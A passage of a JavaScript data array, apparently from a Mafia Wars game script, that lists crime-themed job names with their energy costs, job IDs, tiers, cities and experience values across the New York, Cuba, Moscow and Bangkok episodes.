    ['Distill Some Liquor'                               , 10, 23,4,NY     , 12,0,'     '],
    ['Manufacture Tokens'                                , 10, 24,4,NY     , 12,0,'     '],
    ['Get Cheating Deck'                                 , 10, 25,4,NY     , 12,0,'     '],
    ['Overtake Phone Central'                            , 10, 27,4,NY     , 12,0,'     '],
    ['Repel the Yakuza'                                  , 13, 29,5,NY     , 18,0,'     '],
    ['Disrupt Rival Smuggling Ring'                      , 15, 30,5,NY     , 20,0,'     '],
    ['Invade Tong-controlled Neighborhood'               , 25, 31,5,NY     , 30,0,'     '],
    ['Sell Guns to the Russian Mob'                      , 25, 32,5,NY     , 35,0,'     '],
    ['Protect your City against a Rival Family'          , 35, 33,5,NY     , 50,0,'     '],
    ['Assassinate a Political Figure'                    , 35, 34,5,NY     , 50,0,'     '],
    ['Exterminate a Rival Family'                        , 40, 35,5,NY     , 58,0,'     '],
    ['Obtain Compromising Photos'                        , 28, 43,5,NY     , 32,0,'     '],
    ['Frame a Rival Capo'                                , 26, 44,5,NY     , 33,0,'     '],
    ['Steal an Air Freight Delivery'                     , 32, 45,6,NY     , 36,0,'     '],
    ['Run a Biker Gang Out of Town'                      , 35, 46,6,NY     , 40,0,'     '],
    ['Flip a Snitch'                                     , 25, 47,6,NY     , 30,0,'     '],
    ['Steal Bank Records'                                , 30, 48,6,NY     , 36,0,'     '],
    ['Loot the Police Impound Lot'                       , 60, 49,6,NY     , 60,0,'     '],
    ['Recruit a Rival Crew Member'                       , 30, 50,6,NY     , 39,0,'     '],
    ['Dodge an FBI Tail'                                 , 20, 51,6,NY     , 27,0,'     '],
    ['Whack a Rival Crew Leader'                         , 28, 52,6,NY     , 38,0,'     '],
    ['Influence a Harbor Official'                       , 50, 53,7,NY     , 65,0,'     '],
    ['Move Stolen Merchandise'                           , 36, 54,7,NY     , 50,0,'     '],
    ['Snuff a Rat'                                       , 44, 55,7,NY     , 62,0,'     '],
    ['Help a Fugitive Flee the Country'                  , 40, 56,7,NY     , 57,0,'     '],
    ['Dispose of a Body'                                 , 25, 57,7,NY     , 36,0,'     '],
    ['Ransom a Businessman\'s Kids'                      , 60, 58,7,NY     , 70,0,'     '],
    ['Fix the Big Game'                                  , 50, 59,7,NY     , 60,0,'     '],
    ['Steal an Arms Shipment'                            , 45, 60,7,NY     , 66,0,'     '],
    ['Extort a Corrupt Judge'                            , 24, 61,8,NY     , 36,0,'     '],
    ['Embezzle Funds Through a Phony Company'            , 50, 62,8,NY     , 70,0,'     '],
    ['Break Into the Armory'                             , 50, 63,8,NY     , 60,0,'     '],
    ['Rip Off the Armenian Mob'                          , 50, 64,8,NY     , 68,0,'     '],
    ['Muscle in on a Triad Operation'                    , 45, 65,8,NY     , 68,0,'     '],
    ['Ambush a Rival at a Sit Down'                      , 55, 66,8,NY     , 80,0,'     '],
    ['Order a Hit on a Public Official'                  , 35, 67,8,NY     , 55,0,'     '],
    ['Take Over an Identity Theft Ring'                  , 36, 68,8,NY     , 52,0,'     '],
    ['Settle a Beef... Permanently'                      , 35, 69,9,NY     , 74,0,'     '],
    ['Buy Off a Federal Agent'                           , 35, 70,9,NY     , 50,0,'     '],
    ['Make a Deal with the Mexican Cartel'               , 40, 71,9,NY     , 60,0,'     '],
    ['Blackmail the District Attorney'                   , 44, 72,9,NY     , 66,0,'     '],
    ['Shake Down a City Council Member'                  , 85, 73,9,NY     ,124,0,'     '],
    ['Make Arrangements for a Visiting Don'              , 40, 74,9,NY     , 60,0,'     '],
    ['Take Control of a Casino'                          , 70, 75,9,NY     ,110,0,'     '],
    ['Travel to the Old Country'                         , 52, 76,9,NY     , 82,0,'     '],
    ['Rob Your Cab Driver'                               , 12,  1,1,CUBA   , 16,0,'     '], // CUBA
    ['Secure A Safehouse'                                , 36,  2,1,CUBA   , 49,0,'     '],
    ['Intimidate The Locals'                             , 52,  3,1,CUBA   , 70,0,'     '],
    ['Silence a Noisy Neighbor'                          , 32,  4,1,CUBA   , 44,0,'     '],
    ['Smuggle In Some Supplies'                          , 34,  5,1,CUBA   , 45,0,'     '],
    ['Set Up A Numbers Racket'                           , 44,  6,1,CUBA   , 60,0,'     '],
    ['Establish Contact With The FRG'                    , 38,  7,1,CUBA   , 50,0,'     '],
    ['Take Out The Local Police Chief'                   , 41,  8,1,CUBA   , 55,0,'     '],
    ['"Persuade" A Local To Talk'                        , 51, 41,1,CUBA   , 69,0,'     '],
    ['Assault A Snitch\'s Hideout'                       , 56, 42,1,CUBA   , 75,0,'     '],
    ['Transport A Shipment of US Arms'                   , 42,  9,2,CUBA   , 59,0,'     '],
    ['Meet With The FRG Leadership'                      , 38, 10,2,CUBA   , 54,0,'     '],
    ['Hold Up A Tour Bus'                                , 45, 11,2,CUBA   , 65,0,'     '],
    ['Ambush A Military Patrol'                          , 51, 12,2,CUBA   , 72,0,'     '],
    ['Capture An Army Outpost'                           , 56, 13,2,CUBA   , 79,0,'     '],
    ['Sneak A Friend Of The Family Into The Country'     , 35, 14,2,CUBA   , 50,0,'     '],
    ['Ransack A Local Plantation'                        , 43, 15,2,CUBA   , 61,0,'     '],
    ['Burn Down A Hacienda'                              , 58, 16,2,CUBA   , 82,0,'     '],
    ['Offer "Protection" To A Nightclub'                 , 38, 17,3,CUBA   , 56,0,'     '],
    ['Rob The Banco Nacional Branch'                     , 52, 18,3,CUBA   , 77,0,'     '],
    ['Shake Down A Hotel Owner'                          , 40, 19,3,CUBA   , 58,0,'     '],
    ['Bring The Local Teamsters Under Your Control'      , 46, 20,3,CUBA   , 68,0,'     '],
    ['Help The FRG Steal A Truckload Of Weapons'         , 51, 21,3,CUBA   , 74,0,'     '],
    ['Hijack A Booze Shipment'                           , 45, 22,3,CUBA   , 67,0,'     '],
    ['Pillage A Shipyard'                                , 52, 23,3,CUBA   , 76,0,'     '],
    ['Take Over The Docks'                               , 60, 24,3,CUBA   , 88,0,'     '],
    ['Muscle In On A Local Casino'                       , 44, 25,4,CUBA   , 67,0,'     '],
    ['Establish A Loansharking Business'                 , 49, 26,4,CUBA   , 74,0,'     '],
    ['Eliminate A Rival Family\'s Agent'                 , 42, 27,4,CUBA   , 64,0,'     '],
    ['Pass On Some Intel To The FRG'                     , 45, 28,4,CUBA   , 67,0,'     '],
    ['Execute A Regional Arms Dealer'                    , 50, 29,4,CUBA   , 76,0,'     '],
    ['Sink A Competing Smuggler\'s Ship'                 , 52, 30,4,CUBA   , 78,0,'     '],
    ['Gun Down An Enemy Crew At The Airport'             , 56, 31,4,CUBA   , 85,0,'     '],
    ['Assassinate An Opposing Consigliere'               , 62, 32,4,CUBA   , 93,0,'     '],
    ['Raid The Arms Depot'                               , 53, 33,5,CUBA   , 81,0,'     '],
    ['Supply The FRG With Some Extra Muscle'             , 46, 34,5,CUBA   , 70,0,'     '],
    ['Capture The Airport'                               , 56, 35,5,CUBA   , 85,0,'     '],
    ['Knock Off A Visiting Head Of State'                , 52, 36,5,CUBA   , 79,0,'     '],
    ['Set Up A High Volume Smuggling Operation'          , 55, 37,5,CUBA   , 85,0,'     '],
    ['Blow Up A Rail Line'                               , 50, 38,5,CUBA   , 77,0,'     '],
    ['Attack The Army Command Post'                      , 58, 39,5,CUBA   , 88,0,'     '],
    ['Storm The Presidential Palace'                     , 70, 40,5,CUBA   ,106,0,'     '],
    ['Arrange A New York Drug Shipment'                  , 62, 43,6,CUBA   , 95,0,'     '],
    ['Launder Money Through A Resort'                    , 72, 44,6,CUBA   ,110,0,'     '],
    ['Loot The National Museum'                          , 78, 45,6,CUBA   ,117,0,'     '],
    ['Send Some Help Home To New York'                   , 64, 46,6,CUBA   , 98,0,'     '],
    ['Take Over The Havana Reconstruction'               , 82, 47,6,CUBA   ,123,0,'     '],
    ['Help Get An Associate A No Bid Contract'           , 56, 48,6,CUBA   , 85,0,'     '],
    ['Trans-Ship A Container Full of Refugees'           , 48, 49,6,CUBA   , 73,0,'     '],
    ['Meet With "The Russian"'                           , 58, 50,6,CUBA   , 89,0,'     '],
    ['Smuggle Consumer Electronics for the Vory'         , 46,  1,1,MOSCOW , 61,0,'     '], // MOSCOW EPISODE 1
    ['Arrange A Drug Shipment for the Mafiya'            , 40,  2,1,MOSCOW , 53,0,'     '],
    ['Fight Off An Ultra-National Gang'                  ,112,  3,1,MOSCOW ,115,0,'     '],
    ['Kidnap A Local Gang Leader for the Vory'           , 47,  4,1,MOSCOW , 63,0,'     '], // CHOICE POINT (Vory = 4, Mafia = 7)
  //['Kill A Local Gang Leader for the Mafiya'           , 47,  7,1,MOSCOW , 63,0,'     '],
    ['Collect The Ransom'                                , 50,  5,1,MOSCOW , 64,0,'     '], // CHOICE RESULT (Vory)
    ['Receive Vory Intel On Dmitri'                      , 40,  6,1,MOSCOW , 54,0,'     '], // CHOICE RESULT (Mafia)
  //['Collect the Hit Payoff'                            , 56,  8,1,MOSCOW , 76,0,'     '],
  //['Buy Mafiya Intel On Dmitri'                        , 52,  9,1,MOSCOW , 74,0,'     '],
    ['Threaten A Gang\'s Supplier'                       , 58, 10,1,MOSCOW , 79,0,'     '],
    ['Hijack An Arms Shipment From A Militant Gang'      , 67, 11,1,MOSCOW , 90,0,'     '],
    ['Hospitalize Some Nationalists'                     , 76, 12,1,MOSCOW ,104,0,'     '],
    ['Confront Gang Leader Dmitri Leonov'                ,  1, 13,1,MOSCOW ,  3,0,'     '],
    ['Bribe An Election Official'                        , 57, 14,2,MOSCOW , 77,0,'     '], // MOSCOW EPISODE 2
    ['Silence A Political Critic'                        , 53, 15,2,MOSCOW , 73,0,'     '],
    ['Violently Break Up A Campaign Rally'               ,137, 16,2,MOSCOW ,141,0,'     '],
    ['Fix A Local Election for the Vory'                 , 66, 17,2,MOSCOW , 91,0,'     '], // CHOICE POINT (Vory = 17, Mafia = 20)
  //['Abduct A Candidate\'s Wife For the Mafiya'         , 66, 20,2,MOSCOW , 89,0,'     '],
    ['Extract A Favor From The Winner'                   , 97, 18,2,MOSCOW ,128,0,'     '], // CHOICE RESULT (Vory)
    ['Catch Karpov Accepting A Bribe'                    , 77, 19,2,MOSCOW ,105,0,'     '],
  //['"Convince" The Candidate To Withdraw'              , 90, 21,2,MOSCOW ,126,0,'     '], // CHOICE RESULT (Mafia)
  //['Kill An Investigative Reporter'                    , 75, 22,2,MOSCOW ,107,0,'     '],
    ['Pay Off The Port Authority In Arkhangelsk'         , 57, 23,2,MOSCOW , 77,0,'     '],
    ['Re-route An Equipment Shipment'                    , 80, 24,2,MOSCOW ,106,0,'     '],
    ['Circulate Damaging Photos'                         , 99, 25,2,MOSCOW ,137,0,'     '],
    ['Take Down Party Boss Karpov'                       ,  1, 26,2,MOSCOW ,  3,0,'     '],
    ['Case The RossijaBanc Building'                     , 65, 31,3,MOSCOW , 88,0,'     '], // MOSCOW EPISODE 3
    ['Map Out The Escape Route'                          , 80, 32,3,MOSCOW ,108,0,'     '],
    ['Rob The RossijaBanc Central Repository'            ,165, 33,3,MOSCOW ,172,0,'     '],
    ['Take A Guard Hostage During Your Escape'           , 82, 34,3,MOSCOW ,112,0,'     '], // CHOICE POINT (Vory = 34, Mafia = 37)
  //['Execute A Bank Guard During Your Escape'           , 82, 37,3,MOSCOW ,112,0,'     '],
    ['Use The Guard\'s Keys To Access the Bank Armory'   ,105, 35,3,MOSCOW ,140,0,'     '], // CHOICE RESULT (Vory)
    ['"Borrow" The Guard\'s Uniform After Releasing Him' , 88, 36,3,MOSCOW ,117,0,'     '],
  //['Steal The Bank President\'s Car Keys'              , 99, 38,3,MOSCOW ,132,0,'     '], // CHOICE RESULT (Mafia)
  //['Strip A Uniform Off The Corpse'                    , 91, 39,3,MOSCOW ,121,0,'     '],
    ['Blackmail A Secretary For An Exec\'s Itinerary'    , 96, 40,3,MOSCOW ,129,0,'     '],
    ['Dispose Of A RossijaBanc Exec At Sea'              , 89, 41,3,MOSCOW ,118,0,'     '],
    ['Replace A Guard With Your Own Man'                 ,118, 42,3,MOSCOW ,165,0,'     '],
    ['"Fire" Bank President Gregor Belikov'              ,  1, 43,3,MOSCOW ,  3,0,'     '],
    ['Manage An Escort Service Catering to Soldiers'     ,111, 44,4,MOSCOW ,151,0,'     '], // MOSCOW EPISODE 4
    ['Support The Habit Of A Procurement Officer'        ,125, 45,4,MOSCOW ,170,0,'     '],
    ['Ransack A Defense Contractor\'s Office'            ,198, 46,4,MOSCOW ,210,0,'     '],
    ['Fly To The Siberian Military District'             ,118, 47,4,MOSCOW ,161,0,'     '], // CHOICE POINT (Vory = 47, Mafia = 50)
  //['Travel To The Volga Military District'             ,118, 50,4,MOSCOW ,161,0,'     '],
    ['Rob A Troop Convoy'                                ,108, 48,4,MOSCOW ,143,0,'     '], // CHOICE RESULT (Vory)
    ['Intercept The Base\'s Pay Shipment'                ,105, 49,4,MOSCOW ,143,0,'     '],
  //['Arrange The Sale Of Weapons-Grade Explosives'      ,119, 51,4,MOSCOW ,158,0,'     '], // CHOICE RESULT (Mafia)
  //['Capitalize On An Officer\'s Gambling Problem'      ,107, 52,4,MOSCOW ,146,0,'     '],
    ['Make Connections With An Arms Dealer'              ,123, 53,4,MOSCOW ,168,0,'     '],
    ['Transport Some Stolen Military Hardware'           ,125, 54,4,MOSCOW ,165,0,'     '],
    ['Buy Off The General\'s Command Team'               ,134, 55,4,MOSCOW ,188,0,'     '],
    ['Forcibly Demote General Osipov'                    ,  1, 56,4,MOSCOW ,  3,0,'     '],
    ['Stop A Terrorist Attack In Moscow'                 ,116, 61,5,MOSCOW ,159,0,'     '],  // MOSCOW EPISODE 5
    ['Discover Who Was Responsible'                      ,124, 62,5,MOSCOW ,170,0,'     '],
    ['Hunt Down A Ural Liberation Front Contact'         ,215, 63,5,MOSCOW ,230,0,'     '],
    ['Infiltrate The ULF Cell'                           ,132, 64,5,MOSCOW ,181,0,'     '], // CHOICE POINT (Vory = 64, Mafia = 67)
  //['Discover The Location Of The Next ULF Attack'      ,132, 67,5,MOSCOW ,181,0,'     '], // CHOICE RESULT (Vory)
    ['Help "Plan" The Next Attack'                       ,121, 65,5,MOSCOW ,160,0,'     '],
    ['Sabotage The Plan From The Inside'                 ,127, 66,5,MOSCOW ,174,0,'     '],
  //['Kill A Lookout'                                    ,127, 68,5,MOSCOW ,170,0,'     '], // CHOICE RESULT (Mafia)
  //['Stop The ULF Attack'                               ,131, 69,5,MOSCOW ,180,0,'     '],
    ['Torture A ULF Lieutenant'                          ,120, 70,5,MOSCOW ,164,0,'     '],
    ['Look For The Boss\' Mountain Hideout'              ,135, 71,5,MOSCOW ,180,0,'     '],
    ['Start An Avalanche Above The Terrorist Camp'       ,145, 72,5,MOSCOW ,205,0,'     '],
    ['Battle Sonya "The Wolf" Bassinov'                  ,  1, 73,5,MOSCOW ,  3,0,'     '],
    ['Foil The Sabotage Of Your Moscow Holdings'         ,130, 74,6,MOSCOW ,180,0,'     '], // MOSCOW EPISODE 6
    ['Acquire Classified Files On Crime Syndicates'      ,122, 75,6,MOSCOW ,169,0,'     '],
    ['Gun Down Some Russian Muscle'                      ,238, 76,6,MOSCOW ,258,0,'     '],
    ['Attack A Mafiya Business'                          ,136, 77,6,MOSCOW ,188,0,'     '], // CHOICE POINT (Vory = 77, Mafia = 80)
  //['Burn Down A Vory Safehouse'                        ,136, 80,6,MOSCOW ,188,0,'     '],
    ['Hijack A Mafiya Cargo'                             ,134, 78,6,MOSCOW ,179,0,'     '], // CHOICE RESULT (Vory)
    ['Threaten A Mafiya Moneyman\'s Family'              ,128, 79,6,MOSCOW ,176,0,'     '], // CHOICE RESULT (Mafia)
  //['Hit A Vory Nightclub'                              ,128, 81,6,MOSCOW ,171,0,'     '],
  //['Break Into An Architect\'s Office'                 ,134, 82,6,MOSCOW ,185,0,'     '],
    ['Take Over A West-Bound Trafficking Pipeline'       ,140, 83,6,MOSCOW ,194,0,'     '],
    ['Ship Black-Market Caviar To London'                ,137, 84,6,MOSCOW ,189,0,'     '],
    ['Assault The Mansion Walls'                         ,148, 85,6,MOSCOW ,211,0,'     '],
    ['Take Out Viktor "Sibirchik" Titov'                 ,  1, 86,6,MOSCOW ,  3,0,'     '],
    ['Move Stolen Art Through Suvarnabhumi Airport'      , 71,  1,1,BANGKOK,111,0,'     '], // BANGKOK EPISODE 1
    ['Show A Cocky Biker Who\'s In Charge'               , 63,  2,1,BANGKOK,101,0,'     '],
    ['Take On Local Motorcycle Thugs'                    ,189,  3,1,BANGKOK,253,0,'     '],
    ['Meet A Gang\'s Rep In A Go-Go Bar'                 , 78,  5,1,BANGKOK,120,0,'     '], // CHOICE POINT (Yakuza = 5, Triad = 8)
    ['Torch A Building For Insurance'                    ,110,  6,1,BANGKOK,172,0,'     '], // Yakuza
    ['Arrange An "Accident" For A Witness'               , 71,  7,1,BANGKOK,111,0,'     '], // Yakuza
    ['Raid One Of Suchart\'s Gambling Dens'              , 91,  9,1,BANGKOK,133,0,'     '], // Triad
    ['Trash The Low-Rent Casino'                         , 71, 10,1,BANGKOK,102,0,'     '], // Triad
    ['Intercept An Ammo Shipment'                        , 65, 11,1,BANGKOK, 94,0,'     '], // CHOICE POINT (Yakuza = 11, Triad = 14)
    ['Deliver It To A Japanese Front Company'            , 94, 12,1,BANGKOK,130,0,'     '], // Yakuza
    ['Pay Off A Corrupt Police Officer'                  , 64, 13,1,BANGKOK, 91,0,'     '], // Yakuza
    ['Sneak It On To A Chinese Cargo Ship'               , 71, 15,1,BANGKOK,102,0,'     '], // Triad
    ['Bribe A Dock Guard'                                , 52, 16,1,BANGKOK, 78,0,'     '], // Triad
    ['Blow Up Suchart\'s Warehouse'                      ,111, 17,1,BANGKOK,164,0,'     '],
    ['Take Down Boss Suchart'                            ,  1, 18,1,BANGKOK,  3,0,'     '],
    ['Force A Local Landowner To Sell'                   , 67, 20,2,BANGKOK, 95,0,'     '],  // BANGKOK EPISODE 2
    ['Receive A Kickback From The Buyer'                 , 73, 21,2,BANGKOK,102,0,'     '],
    ['Attack A Paramilitary Police Post'                 ,136, 22,2,BANGKOK,167,0,'     '],
    ['Set Up A Phony Business'                           , 62, 24,2,BANGKOK, 89,0,'     '], // CHOICE POINT (Yakuza = 24, Triad = 27)
    ['Re-Route A Van Full Of Medical Supplies'           , 52, 25,2,BANGKOK, 64,0,'     '], // Yakuza
    ['Resell The Stolen Supplies'                        , 52, 26,2,BANGKOK, 64,0,'     '], // Yakuza
    ['Set Up A Bogus Chess Tournament'                   , 57, 28,2,BANGKOK, 77,0,'     '], // Triad
    ['Rob The Chess Masters'                             , 51, 29,2,BANGKOK, 72,0,'     '], // Triad
    ['Pay Off The Guards At Bangkwang Prison'            , 47, 30,2,BANGKOK, 65,0,'     '], // CHOICE POINT (Yakuza = 30, Triad = 33)
    ['Sneak A Yakuza Enforcer In'                        , 40, 31,2,BANGKOK, 48,0,'     '], // Yakuza
    ['Help Stage An Accident For A Tong Inmate'          , 36, 32,2,BANGKOK, 44,0,'     '], // Yakuza
    ['Break A Triad Hitman Out'                          , 57, 34,2,BANGKOK, 77,0,'     '], // Triad
    ['Help Rub Out A Bosozoku Leader'                    , 62, 35,2,BANGKOK, 89,0,'     '], // Triad
    ['Expose A Crooked Royal Thai Police Officer'        , 94, 36,2,BANGKOK,132,0,'     '],
    ['Discredit Police Commissioner Chatri'              ,  1, 37,2,BANGKOK,  3,0,'     '],
    ['Secure A Pirate Vessel'                            , 43, 39,3,BANGKOK, 46,0,'     '], // CHAPTER 1 // BANGKOK EPISODE 3
    ['Hire An Unsavory Crew'                             , 35, 40,3,BANGKOK, 53,0,'     '], // CHAPTER 1
    ['Take Down A Rival Pirate Outfit'                   ,106, 41,3,BANGKOK,146,0,'     '], // CHAPTER 1  HELP JOB
    ['Hijack A Boat Load Of Electronics'                 , 35, 43,3,BANGKOK, 53,0,'     '], // CHAPTER 2  CHOICE POINT (Yakuza = 43, Triad = 46)
    ['Truck The Cargo To Kuala Lumpur'                   , 60, 44,3,BANGKOK, 93,0,'     '], // CHAPTER 2  Yakuza
    ['Smuggle Cigarettes Back Into Thailand'             , 60, 45,3,BANGKOK, 93,0,'     '], // CHAPTER 2  Yakuza
    ['Ship The Cargo To Jakarta'                         , 49, 47,3,BANGKOK, 75,0,'     '], // CHAPTER 2  Triad
    ['Return With A Shipment Of Weapons'                 , 49, 48,3,BANGKOK, 75,0,'     '], // CHAPTER 2  Triad
    ['Steal Shipping Manifests'                          , 46, 49,3,BANGKOK, 71,0,'     '], // CHAPTER 3  CHOICE POINT (Yakuza = 49, Triad = 52)
    ['Steal Japanese Auto Shipping Containers'           , 56, 53,3,BANGKOK, 88,0,'     '], // CHAPTER 3  Triad
    ['Offload The Cars Onto A Waiting Barge'             , 60, 54,3,BANGKOK, 93,0,'     '], // CHAPTER 3  Triad
    ['Hire Divers To Retrieve The Gold Bars'             , 49, 51,3,BANGKOK, 75,0,'     '], // CHAPTER 3  Yakuza
    ['Sink A Chinese Metals Freighter'                   , 53, 50,3,BANGKOK, 84,0,'     '], // CHAPTER 3  Yakuza
    ['Sink A Fleet Vessel'                               ,107, 55,3,BANGKOK,135,0,'     '], // FINALE
    ['Send Captain Mok Overboard'                        ,  1, 56,3,BANGKOK,  3,0,'     '], // BOSS JOB
    ['Buy Some Chemicals On The Black Market'            , 68, 58,4,BANGKOK, 84,0,'     '], // CHAPTER 1  //  BANGKOK EPISODE 4
    ['Make Contact With The United Wa State Army'        , 52, 59,4,BANGKOK, 64,0,'     '], // CHAPTER 1
    ['Ambush A Burmese Army Convoy'                      ,144, 60,4,BANGKOK,160,0,'     '], // CHAPTER 1  HELP JOB
    ['Establish Contact With A CIA Agent'                , 48, 62,4,BANGKOK, 60,0,'     '], // CHAPTER 2  CHOICE POINT (Yakuza = 62, Triad = 65)
    ['Arrange To Process It In Bangkok'                  , 80, 64,4,BANGKOK,100,0,'     '], // CHAPTER 2  Yakuza
    ['Set Up An Opium Shipment'                          , 76, 63,4,BANGKOK, 92,0,'     '], // CHAPTER 2  Yakuza
    ['Set Up The Import Of Illegal Chinese Arms'         , 64, 66,4,BANGKOK, 80,0,'     '], // CHAPTER 2  Triad
    ['Ship The Yaa Baa Payment To Phuket'                , 60, 67,4,BANGKOK, 76,0,'     '], // CHAPTER 2  Triad
    ['Betray Commander Chang and the UWSA'               , 52, 68,4,BANGKOK, 64,0,'     '], // CHAPTER 3  CHOICE POINT (Yakuza = 68, Triad = 71)
    ['Steal A Seized Drug Shipment'                      , 64, 70,4,BANGKOK, 80,0,'     '], // CHAPTER 3  Yakuza
    ['Pass On Information To The Thai Police'            , 44, 69,4,BANGKOK, 56,0,'     '], // CHAPTER 3  Yakuza
    ['Eliminate An Insurgent Escort'                     , 60, 72,4,BANGKOK, 72,0,'     '], // CHAPTER 3  Triad
    ['Make Off With Stolen Military Hardware'            , 56, 73,4,BANGKOK, 68,0,'     '], // CHAPTER 3  Triad
    ['Attack Chang\'s Heroin-Processing Facility'        , 88, 74,4,BANGKOK,112,0,'     '], // FINALE
    ['Kill Commander Chang'                              ,  1, 75,4,BANGKOK,  3,0,'     '], // BOSS JOB
    ['Ship Burmese Sapphires Into Thailand'              , 72, 77,5,BANGKOK, 92,0,'     '], // CHAPTER 1  // BANGKOK EPISODE 5A-Oyabun
    ['Smuggle The Sapphires Into Tokyo'                  , 52, 78,5,BANGKOK, 68,0,'     '], // CHAPTER 1
    ['Fight Off A Minato-Kai Sponsored Hit'              ,168, 79,5,BANGKOK,188,0,'     '], // CHAPTER 1  HELP JOB
    ['Meet With Boss Matsumura\'s Advisor'               , 56, 81,5,BANGKOK, 72,0,'     '], // CHOICE POINT CHAPTER 2 (Yakuza = 81, Triad = 84)
    ['Help Broker A Minato-Matsumura Peace'              , 68, 82,5,BANGKOK, 88,0,'     '], // CHAPTER 2  Yakuza
    ['Take A Piece Of The Kabukicho Action'              , 68, 83,5,BANGKOK, 88,0,'     '], // CHAPTER 2  Yakuza
    ['Assassinate The Minato-Kai Family Head'            , 64, 85,5,BANGKOK,102,0,'     '], // CHAPTER 2  Triad
    ['Frame An Enemy For The Murder'                     , 67, 86,5,BANGKOK,106,0,'     '], // CHAPTER 2  Triad
    ['Talk With A Police Insider About Matsumura'        , 40, 87,5,BANGKOK, 52,0,'     '], // CHOICE POINT CHAPTER 3 (Yakuza = 87, Triad = 90)
    ['Gather More Evidence Of A Betrayal'                , 80, 88,5,BANGKOK,104,0,'     '], // CHAPTER 3  Yakuza
    ['Get The Support Of The Yakuza Families'            , 84, 89,5,BANGKOK,108,0,'     '], // CHAPTER 3  Yakuza
    ['Spread Distrust Among The Yakuza Families'         , 78, 91,5,BANGKOK,124,0,'     '], // CHAPTER 3  Triad
    ['Start A War Between Matsumura and Minato'          , 78, 92,5,BANGKOK,124,0,'     '], // CHAPTER 3  Triad
    ['Remove Matsumura\'s Loyal Lieutenants'             ,104, 93,5,BANGKOK,132,0,'     '], // FINALE
    ['Execute Oyabun Matsumura'                          ,  1, 94,5,BANGKOK,  3,0,'     '], // BOSS JOB
    ['Set Up A Drug Shipment To China'                   , 49, 96,6,BANGKOK, 79,0,'     '], // CHAPTER 1  // BANGKOK EPISODE 5B-Dragon Head
    ['Dodge Customs At The Port of Hong Kong'            , 64, 97,6,BANGKOK,102,0,'     '], // CHAPTER 1
    ['Win A Shoot-Out With The Kowloon Police'           ,149, 98,6,BANGKOK,208,0,'     '], // CHAPTER 1  HELP JOB
    ['Intimidate Wealthy Expatriates'                    , 64,100,6,BANGKOK,102,0,'     '], // CHOICE POINT CHAPTER 2 (Yakuza = 100, Triad = 103)
    ['Make An Example Of A Wealthy Industrialist'        , 64,101,6,BANGKOK,102,0,'     '], // CHAPTER 2  Yakuza
    ['Fence The Goods Stolen From The Mansion'           , 60,102,6,BANGKOK, 97,0,'     '], // CHAPTER 2  Yakuza
    ['Extort The Head Of The Hong Kong Polo Club'        , 67,104,6,BANGKOK,106,0,'     '], // CHAPTER 2  Triad
    ['Fix The Hong Kong Polo Invitational'               , 64,105,6,BANGKOK,102,0,'     '], // CHAPTER 2  Triad
    ['Talk With Wei\'s Disloyal Enforcers'               , 71,106,6,BANGKOK,115,0,'     '], // CHOICE POINT CHAPTER 3 (Yakuza = 106, Triad = 109)
    ['Sneak An Industrial Spy Into Hong Kong'            , 64,107,6,BANGKOK,102,0,'     '], // CHAPTER 3  Yakuza
    ['Break In To Cheng-Wei Ballistics'                  , 67,108,6,BANGKOK,106,0,'     '], // CHAPTER 3  Yakuza
    ['Kidnap One Of Wei\'s Trusted Advisors'             , 56,110,6,BANGKOK, 88,0,'     '], // CHAPTER 3  Triad
    ['Bury The Body Under A Construction Site'           , 60,111,6,BANGKOK, 97,0,'     '], // Chapter 3  Triad
    ['Attack Wei\'s Gambling Halls'                      , 96,112,6,BANGKOK,155,0,'     '], // FINALE
    ['Dispose Of Mountain Master Wei'                    ,  1,113,6,BANGKOK,  3,0,'     '], // BOSS JOB
    ['Shore Up Control Of Your New Territory'            , 60,115,7,BANGKOK, 97,0,'     '], // CHAPTER 1 // BANGKOK EPISODE 6-Saboteur
    ['Spread The Wealth To Your New Lieutenants'         , 71,116,7,BANGKOK,115,0,'     '], // CHAPTER 1
    ['Eliminate The Last Traces Of Resistance'           ,145,117,7,BANGKOK,199,0,'     '], // CHAPTER 1  HELP JOB
    ['Get A Gang Member Back Into Thailand'              , 71,119,7,BANGKOK,115,0,'     '], // CHOICE POINT CHAPTER 2 (Yakuza = 119, Triad = 122)
    ['Break Into A Goverment Research Facility'          , 74,120,7,BANGKOK,119,0,'     '], // CHAPTER 2  Yakuza
    ['Steal An Experimental Armor Prototype'             , 67,121,7,BANGKOK,106,0,'     '], // CHAPTER 2  Yakuza
    ['Kidnap A Trade Consortium Leader'                  , 74,123,7,BANGKOK,119,0,'     '], // CHAPTER 2  Triad
    ['Extort The Consortium\'s Remaining Officers'       , 64,124,7,BANGKOK,102,0,'     '], // CHAPTER 2  Triad
    ['Undermine Nongchai\'s Support'                     , 78,125,7,BANGKOK,124,0,'     '], // CHOICE POINT CHAPTER 3 (Yakuza = 125, Triad = 128)
    ['Acquire Information On A Government Supporter'     , 71,126,7,BANGKOK,115,0,'     '], // CHAPTER 3  Yakuza
    ['Assassinate A Bangkok Council Member'              , 67,127,7,BANGKOK,106,0,'     '], // CHAPTER 3  Yakuza
    ['Bribe A Royal Thai Army Colonel'                   , 74,129,7,BANGKOK,119,0,'     '], // CHAPTER 3  Triad
    ['Route A Drug Shipment Through An Army Post'        , 64,130,7,BANGKOK,102,0,'     '], // Chapter 3  Triad
    ['Infiltrate The Parliament House'                   , 85,131,7,BANGKOK,137,0,'     '], // FINALE
    ['Depose Prime Minister Nongchai'                    ,  1,132,7,BANGKOK,  3,0,'     '], // BOSS JOB
    ['Consolidate Political Power In Bangkok'            , 56,134,8,BANGKOK, 93,0,'     '], // CHAPTER 1  // BANGKOK EPISODE 7-Assassin
    ['Take Over The Royal Bank Of Thailand'              , 64,135,8,BANGKOK, 97,0,'     '], // CHAPTER 1
    ['Foil An Attempt On Your Life'                      ,156,136,8,BANGKOK,222,0,'     '], // CHAPTER 1  HELP JOB
    ['Question The Surviving Assassin'                   , 74,138,8,BANGKOK,115,0,'     '], // CHAPTER 2
    ['Gather Information On The Shadow King'             , 71,139,8,BANGKOK,115,0,'     '], // CHAPTER 2
    ['Eliminate A Spy For The Shadow King'               , 85,140,8,BANGKOK,133,0,'     '], // CHAPTER 2
    ['Hire A Guide To Find The Temple of Shadows'        , 64,141,8,BANGKOK,102,0,'     '], // CHAPTER 3
    ['Fight Off A Hill Tribe Loyal To The Shadow King'   , 89,142,8,BANGKOK,142,0,'     '], // CHAPTER 3
    ['Silence A Shadow Kingdom Patrol'                   , 81,143,8,BANGKOK,133,0,'     '], // CHAPTER 3
